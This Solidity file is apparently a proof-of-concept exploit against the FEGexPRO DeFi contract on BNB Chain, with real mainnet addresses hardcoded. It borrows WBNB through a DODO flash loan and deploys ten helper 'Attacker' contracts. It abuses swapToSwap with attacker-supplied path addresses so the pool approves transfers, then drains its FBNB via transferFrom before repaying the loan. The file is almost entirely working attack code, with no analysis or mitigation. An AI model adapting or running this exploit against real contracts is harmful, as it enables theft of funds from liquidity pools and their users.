//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
pragma abicoder v2;

import 'hardhat/console.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function _BASE_TOKEN_() external view returns (address);
}

interface IWBNB {
    function balanceOf(address account) external view  returns (uint256);
    function withdraw(uint wad) external;
    function deposit() external payable;
}

interface IFBNB {
    function balanceOf(address account) external view  returns (uint256); 
    function deposit() external payable;
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function withdraw(uint wad) external;
}

interface IFEGexPRO {
    function depositInternal(address asset, uint256 amt)  external;
    function userBalanceInternal(address _addr) external returns (uint256, uint256);
    function swapToSwap(address path, address asset, address to, uint256 amt) external;
}

struct DODOCallBackData {
    address DODO_flash_address;
    uint256 baseAmount;
    uint256 quoteAmount;
}

contract Attacker is Ownable {

    address public constant FBNB_address = 0x87b1AccE6a1958E522233A737313C086551a5c76;
    address public constant FEGexPro_address = 0x818E2013dD7D9bf4547AaabF6B617c1262578bc7;

    constructor(address _owner) {
        transferOwnership(_owner);
    }

    fallback() external payable {
        console.log("Attacker call %s",address(this));
    }
    
    function withdraw_0x2097a739(uint256 amount) external {
        console.log("withdraw %s FBNB to %s", amount, owner());
        IFBNB(FBNB_address).transferFrom(FEGexPro_address, owner(), amount);
    }
    function depositInternal(address asset, uint256 amt) external {}
    function userBalanceInternal(address acc) external returns (uint256 token, uint256 main) {}
    function payMain(address receiver, uint amount) external {}
}

contract AttackFegExProPoc is Ownable {
    
    address public constant DODO_flash_address = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;
    address public constant WBNB_address = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public constant FBNB_address = 0x87b1AccE6a1958E522233A737313C086551a5c76;
    address public constant FEGexPro_address = 0x818E2013dD7D9bf4547AaabF6B617c1262578bc7;

    Attacker[] private myattacker ;
    
    function withDraw() external {

    }
    function createAttacker(address _owner) internal {
        
        Attacker _attacker = new Attacker(_owner);
        myattacker.push(_attacker);
        console.log("createAttacker:");
    }

    function startFlashLoan() public {
        // first get the contracts wbnb num
        uint256 borrow_WBNB = IWBNB(WBNB_address).balanceOf(DODO_flash_address);
        uint baseAmount = 0;
        uint quoteAmount = borrow_WBNB;

        DODOCallBackData memory callbackData;
        callbackData.DODO_flash_address = DODO_flash_address;
        callbackData.baseAmount = baseAmount;
        callbackData.quoteAmount = quoteAmount;
        bytes memory data = abi.encode(callbackData);
        console.log("start flashLoan: wbnb amount %s bnb amount %s", IERC20(WBNB_address).balanceOf(address(this)), address(this).balance);
        IDODO(DODO_flash_address).flashLoan(baseAmount, quoteAmount, address(this), data);
        console.log("finsh:BNB amount %s",address(this).balance);
    }
    fallback() external payable {
        console.log("path call %s",address(this));
    }
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        
        DODOCallBackData memory info = abi.decode(data, (DODOCallBackData));
        
        require(sender == address(this) && msg.sender == info.DODO_flash_address, "HANDLE_FLASH_NENIED");
        require(IWBNB(WBNB_address).balanceOf(address(this)) == info.quoteAmount,"");
        console.log("Now I have WBNB num # %s",IWBNB(WBNB_address).balanceOf(address(this)));
        IWBNB(WBNB_address).withdraw(info.quoteAmount); // WBNB => BNB
        
    
        IFBNB(FBNB_address).deposit{value: 116813809359158325730}(); // BNB => FBNB
        uint256 FEG_PRO_FBNB_amount = IFBNB(FBNB_address).balanceOf(FEGexPro_address);
        console.log("FEGexPro_address FEG_PRO_FBNB_amount:%s",FEG_PRO_FBNB_amount);
        
        for(uint i = 0; i < 10; i++) {
            createAttacker(address(this));
        }

        uint256 fbnbAmount = IFBNB(FBNB_address).balanceOf(address(this));

        console.log("debug # 1 amt of FBNB %s",fbnbAmount);
        
        IFBNB(FBNB_address).approve(FEGexPro_address, fbnbAmount); // for the next deposit

        IFEGexPRO(FEGexPro_address).depositInternal(FBNB_address, 115650737205006082495);

        (uint256 token, uint256 main) = IFEGexPRO(FEGexPro_address).userBalanceInternal(address(this));

        IFEGexPRO(FEGexPro_address).userBalanceInternal(address(this));
        IFEGexPRO(FEGexPro_address).swapToSwap(address(this), FBNB_address, address(this), main);
        for(uint i = 0; i < 10; i++) {
            IFEGexPRO(FEGexPro_address).depositInternal(FBNB_address, 1);
            IFEGexPRO(FEGexPro_address).swapToSwap(address(myattacker[i]), FBNB_address, address(this), main);
        }

        IFBNB(FBNB_address).transferFrom(FEGexPro_address, address(this), main);

        uint256 FEGexPro_fbnb_amount = IFBNB(FBNB_address).balanceOf(FEGexPro_address);

        for(uint i = 0; i < 9; i++) {
            myattacker[i].withdraw_0x2097a739(main);
            FEGexPro_fbnb_amount = IFBNB(FBNB_address).balanceOf(FEGexPro_address);
        }
        // last time withdraw the rest of all FBNB
        myattacker[9].withdraw_0x2097a739(FEGexPro_fbnb_amount);
        // now we need to transfer FBNB to WBNB to return loan funds
        uint256 fbnb_amt = IFBNB(FBNB_address).balanceOf(address(this));
        IFBNB(FBNB_address).withdraw(fbnb_amt);
        IWBNB(WBNB_address).deposit{value:info.quoteAmount}();
        //Note: Realize your own logic using the token from flashLoan pool.1
        //Return funds
        require(IWBNB(WBNB_address).balanceOf(address(this)) == info.quoteAmount, "my wbnb amount should equal to quoteAmount");
        IERC20(WBNB_address).transfer(DODO_flash_address, info.quoteAmount);
    }

    function depositInternal(address asset, uint256 amt) external {}
    function userBalanceInternal(address acc) external returns (uint256 token, uint256 main) {}
    function payMain(address receiver, uint amount) external {}

}